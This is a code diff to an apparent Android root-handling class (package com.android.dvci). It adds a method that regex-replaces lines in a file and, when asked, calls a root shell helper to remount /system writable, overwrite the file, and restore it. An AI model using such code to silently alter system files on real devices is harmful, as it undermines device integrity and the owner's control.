@@ -17,18 +17,28 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.RandomAccessFile;
+import java.io.Writer;
+import java.nio.channels.FileChannel;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
 import java.util.concurrent.Semaphore;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -208,6 +218,104 @@ public class Root {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
+	}
+
+	public static boolean replaceInFile(File fs, File tmpLocal,String matchString,String replace,Boolean isSystemWriting){
+		class LineMatchDetails{
+			public int lineOffset;
+			public String match;
+			public String replace;
+			public LineMatchDetails(int offset,String match,String replace){
+				this.match=match;
+				this.replace=replace;
+				this.lineOffset=offset;
+			}
+		}
+		ArrayList<LineMatchDetails> matchList = new ArrayList<LineMatchDetails>();
+		Writer writer=null;
+		BufferedReader fileReader=null;
+		try {
+			fileReader = new BufferedReader(new InputStreamReader(new FileInputStream(fs.getAbsolutePath())));
+			if(tmpLocal.exists()){
+				tmpLocal.delete();
+			}
+			writer = new BufferedWriter(new FileWriter(tmpLocal));
+			String lineContents ;
+
+			int offset=0;
+			Pattern pattern = Pattern.compile(".*"+matchString+".*");
+			while( (lineContents = fileReader.readLine()) != null)
+			{
+
+				Matcher matcher = pattern.matcher(lineContents);
+				String lineByLine = null;
+				if(matcher.matches())
+				{
+					System.out.printf("%s\n", "match:'"+lineContents+"' line offsets:"+offset);
+					lineByLine = lineContents.replaceAll(matchString,replace);
+					System.out.printf("%s\n", "replaced with:'"+ lineByLine+"'");
+					matchList.add(new LineMatchDetails(offset, lineContents, lineByLine));
+					writer.write(lineByLine+"\n");
+				}else{
+					writer.write(lineContents+"\n");
+				}
+				offset += lineContents.length();
+			}
+			fileReader.close();
+			writer.close();
+			if(!matchList.isEmpty()){
+				if(isSystemWriting) {
+					// Remount /system
+					Execute.execute(Configuration.shellFile + " " + "blw");
+				}
+				try {
+					FileChannel source = null;
+					FileChannel destination = null;
+					FileInputStream fsource = new FileInputStream(tmpLocal);
+					source = fsource.getChannel();
+					FileOutputStream fdestination = new FileOutputStream(fs);
+					destination = fdestination.getChannel();
+					destination.transferFrom(source, 0, source.size());
+					if (source != null) {
+						source.close();
+						fsource.close();
+					}
+					if (destination != null) {
+						destination.close();
+						fdestination.close();
+					}
+
+				} catch (IOException e) {
+
+					System.out.printf("%s\n", " (openCopy trasferForm), error: " + e);
+
+					return false;
+				}
+				return true;
+			}
+		} catch (IOException e) {
+			System.out.printf("%s\n", " (openCopy), error: " + e);
+
+		}finally{
+			if(writer!=null){
+				try {
+					writer.close();
+				} catch (IOException e) {
+				}
+			}
+			if(fileReader!=null){
+				try {
+					fileReader.close();
+				} catch (IOException e) {
+				}
+			}
+			if(isSystemWriting){
+				// Return /system to normal
+				Execute.execute(Configuration.shellFile + " " + "blr");
+			}
+
+		}
+		return false;
 	}
 
 	static public boolean uninstallRoot() {
